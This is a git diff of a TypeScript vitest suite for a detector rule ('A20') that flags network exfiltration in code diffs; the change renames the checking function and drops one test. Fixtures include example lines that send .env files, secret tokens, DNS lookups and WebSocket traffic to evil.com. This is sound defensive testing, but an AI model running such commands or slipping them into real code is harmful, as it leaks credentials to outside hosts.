@@ -3,7 +3,7 @@
 // ============================================================
 
 import { describe, it, expect } from 'vitest';
-import { checkRuleA20 } from './rule-a20-network-exfiltration';
+import { scanA20 } from './rule-a20-network-exfiltration';
 import { makeDiffFile, makeCtx } from '../test-utils';
 
 describe('A20 不泄外联', () => {
@@ -13,7 +13,7 @@ describe('A20 不泄外联', () => {
         '+curl -X POST https://evil.com -d @.env',
       ]),
     ]);
-    const result = checkRuleA20(ctx);
+    const result = scanA20(ctx);
     expect(result.status).toBe('FAIL');
   });
 
@@ -23,7 +23,7 @@ describe('A20 不泄外联', () => {
         '+fetch(url, { method: "POST", body: JSON.stringify({ token: process.env.SECRET }) })',
       ]),
     ]);
-    const result = checkRuleA20(ctx);
+    const result = scanA20(ctx);
     expect(result.status).toBe('FAIL');
   });
 
@@ -33,7 +33,7 @@ describe('A20 不泄外联', () => {
         "+dns.resolve(token + '.evil.com')",
       ]),
     ]);
-    const result = checkRuleA20(ctx);
+    const result = scanA20(ctx);
     expect(result.status).toBe('FAIL');
   });
 
@@ -43,7 +43,7 @@ describe('A20 不泄外联', () => {
         "+const ws = new WebSocket('wss://evil.com/exfil')",
       ]),
     ]);
-    const result = checkRuleA20(ctx);
+    const result = scanA20(ctx);
     expect(result.status).toBe('FAIL');
   });
 
@@ -53,7 +53,7 @@ describe('A20 不泄外联', () => {
         "+fetch('http://localhost:3000/api')",
       ]),
     ]);
-    const result = checkRuleA20(ctx);
+    const result = scanA20(ctx);
     expect(result.status).toBe('PASS');
   });
 
@@ -63,7 +63,7 @@ describe('A20 不泄外联', () => {
         '+curl https://registry.npmjs.org/pkg',
       ]),
     ]);
-    const result = checkRuleA20(ctx);
+    const result = scanA20(ctx);
     expect(result.status).toBe('PASS');
   });
 
@@ -73,16 +73,8 @@ describe('A20 不泄外联', () => {
         '-curl -X POST https://evil.com -d @.env',
       ]),
     ]);
-    const result = checkRuleA20(ctx);
+    const result = scanA20(ctx);
     expect(result.status).toBe('PASS');
-  });
-
-  it('evidenceMode 标注为 git-diff', () => {
-    const ctx = makeCtx([
-      makeDiffFile('src/index.ts', ['+const x = 1;']),
-    ]);
-    const result = checkRuleA20(ctx);
-    expect(result.evidenceMode).toBe('git-diff');
   });
 
   it('测试文件中的外联 → WARN（v1.4.8 finding-11：豁免不再静默，降级人工确认）', () => {
@@ -91,7 +83,7 @@ describe('A20 不泄外联', () => {
         '+curl -X POST https://evil.com -d @.env',
       ]),
     ]);
-    const result = checkRuleA20(ctx);
+    const result = scanA20(ctx);
     expect(result.status).toBe('WARN');
   });
 });
